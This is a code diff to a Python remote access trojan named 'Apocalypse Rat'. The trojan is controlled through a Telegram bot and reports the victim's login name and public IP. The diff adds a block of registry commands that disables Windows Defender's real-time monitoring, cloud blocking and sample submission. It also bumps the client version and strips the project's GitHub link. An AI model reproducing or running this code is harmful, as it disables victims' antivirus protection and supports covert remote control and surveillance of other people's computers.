@@ -36,6 +36,21 @@ bot = telebot.TeleBot(bot_token)
 username = getlogin()
 r = requests.get('https://ip.42.pl/raw')
 IP = r.text
+# -------------Отключение WinDefender(можете удалить)--#
+
+os.system(r"""
+set vers=15
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v AllowFastServiceStartup /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v LocalSettingOverrideSpynetReporting /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
+spauses
+""")
 
 # -----------------------Функции-----------------------#
 
@@ -418,7 +433,7 @@ def callback_query(call):
     elif call.data == 'system_monitor':
         system_monitor()
     elif call.data == 'mark':
-        bot.send_message(adm, f'🕳️ *Apocalypse Rat*\n\n*GitHub* - https://github.com/A-CodeCreater/ApocalypseRat/tree/master \n\n🆚*Версия клиента* - 0.0.1 BetaRls\n🫂*Текущий клиент* - {getlogin()}', parse_mode='Markdown')
+        bot.send_message(adm, f'🕳️ *Apocalypse Rat*\n\n*GitHub* - \n\n🆚*Версия клиента* - 0.0.2 BetaRls\n🫂*Текущий клиент* - {getlogin()}', parse_mode='Markdown')
 
 
 while True:
